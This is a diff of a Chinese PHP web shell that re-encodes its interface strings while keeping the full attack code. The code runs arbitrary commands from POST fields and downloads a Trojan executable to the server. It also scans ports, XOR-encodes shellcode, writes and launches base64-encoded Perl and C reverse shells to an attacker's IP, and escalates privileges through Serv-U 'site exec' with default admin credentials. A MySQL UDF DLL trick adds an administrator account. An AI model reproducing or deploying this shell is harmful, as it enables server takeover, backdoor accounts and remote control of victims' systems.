+		array("Oracle 8 Êı¾İ¿â",Info_Fun("OCILogOff")),
+		array("PRELÏàÈİÓï·¨ PCRE",Info_Fun("preg_match")),
+		array("PDFÎÄµµÖ§³Ö",Info_Fun("pdf_close")),
+		array("Postgre SQLÊı¾İ¿â",Info_Fun("pg_close")),
+		array("SNMPÍøÂç¹ÜÀíĞ­Òé",Info_Fun("snmpget")),
+		array("Ñ¹ËõÎÄ¼şÖ§³Ö(Zlib)",Info_Fun("gzclose")),
+		array("XML½âÎö",Info_Fun("xml_set_object")),
 		array("FTP",Info_Fun("ftp_login")),
-		array("ODBCæ•°æ®åº“è¿æ¥",Info_Fun("odbc_close")),
-		array("Sessionæ”¯æŒ",Info_Fun("session_start")),
-		array("Socketæ”¯æŒ",Info_Fun("fsockopen")),
+		array("ODBCÊı¾İ¿âÁ¬½Ó",Info_Fun("odbc_close")),
+		array("SessionÖ§³Ö",Info_Fun("session_start")),
+		array("SocketÖ§³Ö",Info_Fun("fsockopen")),
 	);
 	echo '<table width="100%" border="0">';
 	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
@@ -920,7 +923,7 @@ function Info_f()
 	return true;
 }
 
-//æ‰§è¡Œå‘½ä»¤
+//Ö´ĞĞÃüÁî
 
 function Exec_Run($cmd)
 {
@@ -953,7 +956,7 @@ function Root_Check($check)
 
 function Exec_g()
 {
-	$res = 'å›æ˜¾çª—å£';
+	$res = '»ØÏÔ´°¿Ú';
 	$cmd = 'dir';
 	if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}
 print<<<END
@@ -972,24 +975,24 @@ function sFull(i){
 }
 </script>
 <form method="POST" name="gform" id="gform" action="?s=g"><center><div class="actall">
-å‘½ä»¤å‚æ•° <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:369px;">
+ÃüÁî²ÎÊı <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:369px;">
 <select onchange='return sFull(options[selectedIndex].value)'>
-<option value="0" selected>--å‘½ä»¤é›†åˆ--</option>
-<option value="1">æ·»åŠ ç®¡ç†å‘˜</option>
-<option value="2">è®¾ä¸ºç®¡ç†ç»„</option>
-<option value="3">æŸ¥çœ‹ç«¯å£</option>
-<option value="4">æŸ¥çœ‹åœ°å€</option>
-<option value="5">å¤åˆ¶æ–‡ä»¶</option>
-<option value="6">FTPä¸‹è½½</option>
+<option value="0" selected>--ÃüÁî¼¯ºÏ--</option>
+<option value="1">Ìí¼Ó¹ÜÀíÔ±</option>
+<option value="2">ÉèÎª¹ÜÀí×é</option>
+<option value="3">²é¿´¶Ë¿Ú</option>
+<option value="4">²é¿´µØÖ·</option>
+<option value="5">¸´ÖÆÎÄ¼ş</option>
+<option value="6">FTPÏÂÔØ</option>
 </select>
-<input type="submit" value="æ‰§è¡Œ" style="width:80px;"></div>
+<input type="submit" value="Ö´ĞĞ" style="width:80px;"></div>
 <div class="actall"><textarea name="show" style="width:630px;height:300px;">{$res}</textarea></div></center>
 </form>
 END;
 	return true;
 }
 
-//ç»„ä»¶æ¥å£
+//×é¼ş½Ó¿Ú
 
 function Com_h()
 {
@@ -1005,24 +1008,24 @@ END;
 if($object == 'downloader')
 {
 print<<<END
-æ–‡ä»¶ä½ç½®<br><input name="durl" value="http://www.baidu.com/down/muma.exe" type="text" style="width:600px;">
-<br><br>ä¸‹è½½åˆ°<br><input name="dpath" value="./myshell.php" type="text" style="width:600px;">
-<input value="ä¸‹è½½" type="submit" style="width:80px;"></form><br>
+ÎÄ¼şÎ»ÖÃ<br><input name="durl" value="http://www.baidu.com/down/muma.exe" type="text" style="width:600px;">
+<br><br>ÏÂÔØµ½<br><input name="dpath" value="./myshell.php" type="text" style="width:600px;">
+<input value="ÏÂÔØ" type="submit" style="width:80px;"></form><br>
 END;
 	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
 	{
 		$contents = @file_get_contents($_POST['durl']);
-		if(!$contents) echo 'æ— æ³•è¯»å–è¦ä¸‹è½½çš„æ•°æ®';
-		elseif(file_exists($_POST['dpath'])) echo 'æ–‡ä»¶'.$_POST['dpath'].'å·²å­˜åœ¨';
-		else echo File_Write($_POST['dpath'],$contents,'wb') ? 'ä¸‹è½½æ–‡ä»¶æˆåŠŸ' : 'ä¸‹è½½æ–‡ä»¶å¤±è´¥';
+		if(!$contents) echo 'ÎŞ·¨¶ÁÈ¡ÒªÏÂÔØµÄÊı¾İ';
+		elseif(file_exists($_POST['dpath'])) echo 'ÎÄ¼ş'.$_POST['dpath'].'ÒÑ´æÔÚ';
+		else echo File_Write($_POST['dpath'],$contents,'wb') ? 'ÏÂÔØÎÄ¼ş³É¹¦' : 'ÏÂÔØÎÄ¼şÊ§°Ü';
 	}
 }
 elseif($object == 'wscript')
 {
 	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir';
 print<<<END
-æ‰§è¡ŒCMDå‘½ä»¤<br> <input type="text" name="cmd" value="{$cmd}" style="width:600px;">
-<input type="submit" value="æ‰§è¡Œ" style="width:80px;"></form><br>
+Ö´ĞĞCMDÃüÁî<br> <input type="text" name="cmd" value="{$cmd}" style="width:600px;">
+<input type="submit" value="Ö´ĞĞ" style="width:80px;"></form><br>
 END;
 	if(!empty($_POST['cmd']))
 	{
@@ -1040,14 +1043,14 @@ elseif($object == 'application')
 	$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';
 	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\windows\php.ini c:\php.ini';
 print<<<END
-ç¨‹åºè·¯å¾„<br><input type="text" name="run" value="{$run}" style="width:600px;">
-<br><br>å‘½ä»¤å‚æ•°<br><input type="text" name="cmd" value="{$cmd}" style="width:600px;">
-<br><br><input type="submit" value="æ‰§è¡Œ" style="width:80px;"></form><br>
+³ÌĞòÂ·¾¶<br><input type="text" name="run" value="{$run}" style="width:600px;">
+<br><br>ÃüÁî²ÎÊı<br><input type="text" name="cmd" value="{$cmd}" style="width:600px;">
+<br><br><input type="submit" value="Ö´ĞĞ" style="width:80px;"></form><br>
 END;
 	if(!empty($_POST['run']))
 	{
 		$shell = new COM('application');
-		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'æ‰§è¡ŒæˆåŠŸ' : 'æ‰§è¡Œå¤±è´¥';
+		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'Ö´ĞĞ³É¹¦' : 'Ö´ĞĞÊ§°Ü';
 		@$shell->Release();
 		$shell = NULL;
 	}
@@ -1064,7 +1067,7 @@ function hFull(i){
 	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
 	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
 	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
-	Str[4] = "Provider=MSDAORA.1;Password=å¯†ç ;User ID=å¸å·;Data Source=æœåŠ¡å;Persist Security Info=True;";
+	Str[4] = "Provider=MSDAORA.1;Password=ÃÜÂë;User ID=ÕÊºÅ;Data Source=·şÎñÃû;Persist Security Info=True;";
 	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
 	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES('spider','mypass')";
 	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
@@ -1077,25 +1080,25 @@ function hFull(i){
 	return true;
 }
 </script>
-æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²<br> <input type="text" name="string" id="string" value="{$string}" style="width:600px;">
+Êı¾İ¿âÁ¬½Ó×Ö·û´®<br> <input type="text" name="string" id="string" value="{$string}" style="width:600px;">
 <select onchange="return hFull(options[selectedIndex].value)">
-<option value="0" selected>--è¿æ¥ç¤ºä¾‹--</option>
-<option value="1">Accessè¿æ¥</option>
-<option value="2">MsSqlè¿æ¥</option>
-<option value="3">MySqlè¿æ¥</option>
-<option value="4">Oracleè¿æ¥</option>
-<option value="5">--SQLè¯­æ³•--</option>
-<option value="6">æ˜¾ç¤ºæ•°æ®</option>
-<option value="7">æ·»åŠ æ•°æ®</option>
-<option value="8">åˆ é™¤æ•°æ®</option>
-<option value="9">ä¿®æ”¹æ•°æ®</option>
-<option value="10">å»ºæ•°æ®è¡¨</option>
-<option value="11">åˆ æ•°æ®è¡¨</option>
-<option value="12">æ·»åŠ å­—æ®µ</option>
-<option value="13">åˆ é™¤å­—æ®µ</option>
+<option value="0" selected>--Á¬½ÓÊ¾Àı--</option>
+<option value="1">AccessÁ¬½Ó</option>
+<option value="2">MsSqlÁ¬½Ó</option>
+<option value="3">MySqlÁ¬½Ó</option>
+<option value="4">OracleÁ¬½Ó</option>
+<option value="5">--SQLÓï·¨--</option>
+<option value="6">ÏÔÊ¾Êı¾İ</option>
+<option value="7">Ìí¼ÓÊı¾İ</option>
+<option value="8">É¾³ıÊı¾İ</option>
+<option value="9">ĞŞ¸ÄÊı¾İ</option>
+<option value="10">½¨Êı¾İ±í</option>
+<option value="11">É¾Êı¾İ±í</option>
+<option value="12">Ìí¼Ó×Ö¶Î</option>
+<option value="13">É¾³ı×Ö¶Î</option>
 </select>
-<br><br>SQLå‘½ä»¤<br> <input type="text" name="sql" id="sql" value="{$sql}" style="width:600px;">
-<input type="submit" value="æ‰§è¡Œ" style="width:80px;">
+<br><br>SQLÃüÁî<br> <input type="text" name="sql" id="sql" value="{$sql}" style="width:600px;">
+<input type="submit" value="Ö´ĞĞ" style="width:80px;">
 </form><br>
 END;
 	if(!empty($string))
@@ -1105,7 +1108,7 @@ END;
 		$result = @$shell->Execute($sql);
 		$count = $result->Fields->Count();
 		for($i=0;$i < $count;$i++){$Field[$i] = $result->Fields($i);}
-		echo $result ? $sql.' æ‰§è¡ŒæˆåŠŸ<br>' : $sql.' æ‰§è¡Œå¤±è´¥<br>';
+		echo $result ? $sql.' Ö´ĞĞ³É¹¦<br>' : $sql.' Ö´ĞĞÊ§°Ü<br>';
 		if(!empty($count)){while(!$result->EOF){for($i=0;$i < $count;$i++){echo $Field[$i]->value.'<br>';}@$result->MoveNext();}}
 		$shell->Close();
 		@$shell->Release();
@@ -1116,16 +1119,16 @@ END;
 	return true;
 }
 
-//ç«¯å£æ‰«æ
+//¶Ë¿ÚÉ¨Ãè
 
 function Port_i()
 {
 print<<<END
 <div class="actall" style="height:200px;">
 <form method="POST" name="iform" id="iform" action="?s=i">
-æ‰«æIP<br><input type="text" name="ip" value="127.0.0.1" style="width:600px;">
-<br><br>ç«¯å£å·<br><input type="text" name="port" value="21|23|25|80|110|135|139|445|1433|3306|3389|43958" style="width:600px;">
-<br><br> <input type="submit" value="æ‰«æ" style="width:80px;">
+É¨ÃèIP<br><input type="text" name="ip" value="127.0.0.1" style="width:600px;">
+<br><br>¶Ë¿ÚºÅ<br><input type="text" name="port" value="21|23|25|80|110|135|139|445|1433|3306|3389|43958" style="width:600px;">
+<br><br> <input type="submit" value="É¨Ãè" style="width:80px;">
 </form><br>
 END;
 	if((!empty($_POST['ip'])) && (!empty($_POST['port'])))
@@ -1134,7 +1137,7 @@ END;
 		for($i = 0;$i < count($ports);$i++)
 		{
 			$fp = @fsockopen($_POST['ip'],$ports[$i], &$errno, &$errstr, 1);
-			echo $fp ? '<font color="#FF0000">å¼€æ”¾ç«¯å£ ---> '.$ports[$i].'</font><br>' : 'å…³é—­ç«¯å£ ---> '.$ports[$i].'<br>';
+			echo $fp ? '<font color="#FF0000">¿ª·Å¶Ë¿Ú ---> '.$ports[$i].'</font><br>' : '¹Ø±Õ¶Ë¿Ú ---> '.$ports[$i].'<br>';
 			ob_flush();
 			flush();
 		}
@@ -1143,7 +1146,7 @@ END;
 	return true;
 }
 
-//ç½‘é©¬è½¬æ¢
+//ÍøÂí×ª»»
 
 function shellcode_decode($Url_String,$Oday_value)
 {
@@ -1207,34 +1210,34 @@ function Shellcode_j()
 		if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code'],$Oday_value);}
 		if($_POST['xor'] == 'b'){$checkeda = '';$checkedb = ' checked';$Shell_Code_Array = shellcode_findxor($_POST['code']);$Shell_Code = $Shell_Code_Array[0];$Oday_value = $Shell_Code_Array[1];}
 		if(!$Oday_value) $Oday_value = '0';
-		if(!$Shell_Code) $Shell_Code = 'æœªæ‰¾åˆ°shellcodeä¸­çš„ä¸‹è½½åœ°å€';
+		if(!$Shell_Code) $Shell_Code = 'Î´ÕÒµ½shellcodeÖĞµÄÏÂÔØµØÖ·';
 		$Shell_Code = htmlspecialchars($Shell_Code);
 	}
 print<<<END
 <form method="POST" name="jform" id="jform" action="?s=j"><center>
-<div class="actall">å¼‚æˆ–å€¼<input name="number" value="{$Oday_value}" type="text" style="width:30px">&nbsp;&nbsp;&nbsp;
-<input type="radio" name="xor" value="a"{$checkeda}>shellcodeå¼‚æˆ–åŠ å¯† <input type="radio" name="xor" value="b"{$checkedb}>shellcodeå¼‚æˆ–è§£å¯†</div>
+<div class="actall">Òì»òÖµ<input name="number" value="{$Oday_value}" type="text" style="width:30px">&nbsp;&nbsp;&nbsp;
+<input type="radio" name="xor" value="a"{$checkeda}>shellcodeÒì»ò¼ÓÃÜ <input type="radio" name="xor" value="b"{$checkedb}>shellcodeÒì»ò½âÃÜ</div>
 <div class="actall"><textarea name="code" rows="20" cols="90">{$Shell_Code}</textarea></div>
-<div class="actall"><input type="submit" value="æ•°æ®è½¬æ¢" style="width:80px;"></div>
+<div class="actall"><input type="submit" value="Êı¾İ×ª»»" style="width:80px;"></div>
 </center></form>
 END;
 	return true;
 }
 
-//Linuxææƒ
+//LinuxÌáÈ¨
 
 function Linux_k()
 {
 	$yourip = getenv('REMOTE_ADDR');
 print<<<END
 <div class="actall" style="height:100px;"><form method="POST" name="kform" id="kform" action="?s=k">
-ä½ çš„IP <input type="text" name="yourip" value="{$yourip}" style="width:200px">
-ä½ çš„ç«¯å£ <input type="text" name="yourport" value="12345" style="width:200px">
-ä½¿ç”¨è„šæœ¬ <select name="use" >
+ÄãµÄIP <input type="text" name="yourip" value="{$yourip}" style="width:200px">
+ÄãµÄ¶Ë¿Ú <input type="text" name="yourport" value="12345" style="width:200px">
+Ê¹ÓÃ½Å±¾ <select name="use" >
 <option value="perl">perl</option>
 <option value="c">c</option>
 </select>
-<input type="submit" value="å¼€å§‹è¿æ¥" style="width:80px;"></form><br>
+<input type="submit" value="¿ªÊ¼Á¬½Ó" style="width:80px;"></form><br>
 END;
 	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
 	{
@@ -1247,10 +1250,10 @@ END;
 			"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
 			"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
 			"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
-			echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? 'åˆ›å»º/tmp/spider_bcæˆåŠŸ<br>' : 'åˆ›å»º/tmp/spider_bcå¤±è´¥<br>';
+			echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? '´´½¨/tmp/spider_bc³É¹¦<br>' : '´´½¨/tmp/spider_bcÊ§°Ü<br>';
 			$perlpath = Exec_Run('which perl');
 			$perlpath = $perlpath ? chop($perlpath) : 'perl';
-			echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'æ‰§è¡Œå‘½ä»¤å¤±è´¥';
+			echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ĞĞÃüÁîÊ§°Ü';
 		}
 		if($_POST['use'] == 'c')
 		{
@@ -1262,47 +1265,47 @@ END;
 			"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
 			"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
 			"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
-			echo File_Write('/tmp/spider_bc.c',base64_decode($back_connect_c),'wb') ? 'åˆ›å»º/tmp/spider_bc.cæˆåŠŸ<br>' : 'åˆ›å»º/tmp/spider_bc.cå¤±è´¥<br>';
+			echo File_Write('/tmp/spider_bc.c',base64_decode($back_connect_c),'wb') ? '´´½¨/tmp/spider_bc.c³É¹¦<br>' : '´´½¨/tmp/spider_bc.cÊ§°Ü<br>';
 			$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
 			@unlink('/tmp/spider_bc.c');
-			echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'æ‰§è¡Œå‘½ä»¤å¤±è´¥';
+			echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ĞĞÃüÁîÊ§°Ü';
 		}
-		echo '<br>ä½ å¯ä»¥å°è¯•è¿æ¥ç«¯å£ (nc -l -n -v -p '.$_POST['yourport'].')';
+		echo '<br>Äã¿ÉÒÔ³¢ÊÔÁ¬½Ó¶Ë¿Ú (nc -l -n -v -p '.$_POST['yourport'].')';
 	}
 	echo '</div>';
 	return true;
 }
 
-//ServUææƒ
+//ServUÌáÈ¨
 
 function Servu_l()
 {
 print<<<END
-<div class="actall"><a href="?s=l">[æ‰§è¡Œå‘½ä»¤]</a> <a href="?s=l&o=adduser">[æ·»åŠ ç”¨æˆ·]</a></div>
+<div class="actall"><a href="?s=l">[Ö´ĞĞÃüÁî]</a> <a href="?s=l&o=adduser">[Ìí¼ÓÓÃ»§]</a></div>
 <form method="POST">
-	<div class="actall">ServUç«¯å£ <input name="SUPort" type="text" value="43958" style="width:300px"></div>
-	<div class="actall">ServUç”¨æˆ· <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
-	<div class="actall">ServUå¯†ç  <input name="SUPass" type="text" value="#l@\$ak#.lk;0@P" style="width:300px"></div>
+	<div class="actall">ServU¶Ë¿Ú <input name="SUPort" type="text" value="43958" style="width:300px"></div>
+	<div class="actall">ServUÓÃ»§ <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
+	<div class="actall">ServUÃÜÂë <input name="SUPass" type="text" value="#l@\$ak#.lk;0@P" style="width:300px"></div>
 END;
 if($_GET['o'] == 'adduser')
 {
 print<<<END
-<div class="actall">å¸å· <input name="user" type="text" value="spider" style="width:200px">
-å¯†ç  <input name="password" type="text" value="spider" style="width:200px">
-ç›®å½• <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
+<div class="actall">ÕÊºÅ <input name="user" type="text" value="spider" style="width:200px">
+ÃÜÂë <input name="password" type="text" value="spider" style="width:200px">
+Ä¿Â¼ <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
 END;
 }
 else
 {
 print<<<END
-<div class="actall">ææƒå‘½ä»¤ <input name="SUCommand" type="text" value="net user spider spider /add & net localgroup administrators spider /add" style="width:600px"><br>
+<div class="actall">ÌáÈ¨ÃüÁî <input name="SUCommand" type="text" value="net user spider spider /add & net localgroup administrators spider /add" style="width:600px"><br>
 <input name="user" type="hidden" value="spider">
 <input name="password" type="hidden" value="spider">
 <input name="part" type="hidden" value="C:\\\\"></div>
 END;
 }
 print<<<END
-  <div class="actall"><input type="submit" value="æ‰§è¡Œ" style="width:80px;"><br><br>
+  <div class="actall"><input type="submit" value="Ö´ĞĞ" style="width:80px;"><br><br>
 END;
 	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
 	{
@@ -1315,57 +1318,57 @@ END;
 		$deldomain = "-DELETEDOMAIN\r\n"."-IP=0.0.0.0\r\n"." PortNo=21\r\n";
 		$sock = @fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
 		$recvbuf = @fgets($sock, 1024);
-		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 		$sendbuf = "USER ".$_POST["SUUser"]."\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 		$sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 		$sendbuf = "SITE MAINTENANCE\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 		$sendbuf = $domain;
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 		$sendbuf = $adduser;
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 		if(!empty($_POST['SUCommand']))
 		{
 	 		$exp = @fsockopen("127.0.0.1", "21", &$errno, &$errstr, 10);
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+	 		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 	 		$sendbuf = "USER ".$_POST['user']."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+	 		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+	 		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 	 		$sendbuf = "PASS ".$_POST['password']."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+	 		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+	 		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 	 		$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "<font color=blue>å‘é€: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
+	 		echo "<font color=blue>·¢ËÍ: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+	 		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 	 		$sendbuf = $deldomain;
 	 		@fputs($sock, $sendbuf, strlen($sendbuf));
-	 		echo "<font color=blue>å‘é€: $sendbuf</font><br>";
+	 		echo "<font color=blue>·¢ËÍ: $sendbuf</font><br>";
 	 		$recvbuf = @fgets($sock, 1024);
-	 		echo "<font color=red>å›åº”: $recvbuf</font><br>";
+	 		echo "<font color=red>»ØÓ¦: $recvbuf</font><br>";
 	 		@fclose($exp);
 		}
 	}
@@ -1373,7 +1376,7 @@ END;
 	echo '</div></form>';
 }
 
-//MYSQLææƒ
+//MYSQLÌáÈ¨
 
 function Mysql_shellcode()
 {
@@ -1382,8 +1385,8 @@ function Mysql_shellcode()
 
 function Mysql_m()
 {
-	$MSG_BOX = 'è¯·å…ˆå¯¼å‡ºDLL,å†æ‰§è¡Œå‘½ä»¤.MYSQLç”¨æˆ·å¿…é¡»ä¸ºrootæƒé™,å¯¼å‡ºè·¯å¾„å¿…é¡»èƒ½åŠ è½½DLLæ–‡ä»¶.';
-	$info = 'å‘½ä»¤å›æ˜¾';
+	$MSG_BOX = 'ÇëÏÈµ¼³öDLL,ÔÙÖ´ĞĞÃüÁî.MYSQLÓÃ»§±ØĞëÎªrootÈ¨ÏŞ,µ¼³öÂ·¾¶±ØĞëÄÜ¼ÓÔØDLLÎÄ¼ş.';
+	$info = 'ÃüÁî»ØÏÔ';
 	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $mpath = 'C:/windows/mysqlDll.dll'; $sqlcmd = 'ver';
 	if(isset($_POST['mhost']) && isset($_POST['muser']))
 	{
@@ -1406,14 +1409,14 @@ function Mysql_m()
 						{
 							$ap = explode('/', $mpath); $inpath = array_pop($ap);
 							$query = 'Create Function state returns string soname \''.$inpath.'\';';
-							$MSG_BOX = @mysql_query($query,$conn) ? 'å®‰è£…DLLæˆåŠŸ' : 'å®‰è£…DLLå¤±è´¥';
+							$MSG_BOX = @mysql_query($query,$conn) ? '°²×°DLL³É¹¦' : '°²×°DLLÊ§°Ü';
 						}
-						else $MSG_BOX = 'å¯¼å‡ºDLLæ–‡ä»¶å¤±è´¥';
+						else $MSG_BOX = 'µ¼³öDLLÎÄ¼şÊ§°Ü';
 					}
-					else $MSG_BOX = 'å†™å…¥ä¸´æ—¶è¡¨å¤±è´¥';
+					else $MSG_BOX = 'Ğ´ÈëÁÙÊ±±íÊ§°Ü';
 					@mysql_query('DROP TABLE Spider_Temp_Tab;',$conn);
 				}
-				else $MSG_BOX = 'åˆ›å»ºä¸´æ—¶è¡¨å¤±è´¥';
+				else $MSG_BOX = '´´½¨ÁÙÊ±±íÊ§°Ü';
 			}
 			if(!empty($_POST['runcmd']))
 			{
@@ -1424,12 +1427,12 @@ function Mysql_m()
 					$k = 0; $info = NULL;
 					while($row = @mysql_fetch_array($result)){$infotmp .= $row[$k];$k++;}
 					$info = $infotmp;
-					$MSG_BOX = 'æ‰§è¡ŒæˆåŠŸ';
+					$MSG_BOX = 'Ö´ĞĞ³É¹¦';
 				}
-				else $MSG_BOX = 'æ‰§è¡Œå¤±è´¥';
+				else $MSG_BOX = 'Ö´ĞĞÊ§°Ü';
 			}
 		}
-		else $MSG_BOX = 'è¿æ¥MYSQLå¤±è´¥';
+		else $MSG_BOX = 'Á¬½ÓMYSQLÊ§°Ü';
 	}
 print<<<END
 <script language="javascript">
@@ -1453,29 +1456,29 @@ function Fullm(i){
 <form method="POST" name="mform" id="mform" action="?s=m">
 <div id="msgbox" class="msgbox">{$MSG_BOX}</div>
 <div class="actall">
-åœ°å€ <input type="text" name="mhost" value="{$mhost}" style="width:110px">
-ç«¯å£ <input type="text" name="mport" value="{$mport}" style="width:110px">
-ç”¨æˆ· <input type="text" name="muser" value="{$muser}" style="width:110px">
-å¯†ç  <input type="text" name="mpass" value="{$mpass}" style="width:110px">
-åº“å <input type="text" name="mdata" value="{$mdata}" style="width:110px">
+µØÖ· <input type="text" name="mhost" value="{$mhost}" style="width:110px">
+¶Ë¿Ú <input type="text" name="mport" value="{$mport}" style="width:110px">
+ÓÃ»§ <input type="text" name="muser" value="{$muser}" style="width:110px">
+ÃÜÂë <input type="text" name="mpass" value="{$mpass}" style="width:110px">
+¿âÃû <input type="text" name="mdata" value="{$mdata}" style="width:110px">
 </div><center><div class="actall">
-å¯åŠ è½½è·¯å¾„ <input type="text" name="mpath" value="{$mpath}" style="width:400px"> 
-<input type="submit" name="outdll" value="å¯¼å‡ºDLL" style="width:80px;"></div>
+¿É¼ÓÔØÂ·¾¶ <input type="text" name="mpath" value="{$mpath}" style="width:400px"> 
+<input type="submit" name="outdll" value="µ¼³öDLL" style="width:80px;"></div>
 <div class="actall"><select onchange="return Fullm(options[selectedIndex].value)">
-<option value="0" selected>--å‘½ä»¤é›†åˆ--</option>
-<option value="1">æ·»åŠ ç®¡ç†å‘˜</option>
-<option value="2">è®¾ä¸ºç®¡ç†ç»„</option>
-<option value="3">å¼€å¯è¿œç¨‹æ¡Œé¢</option>
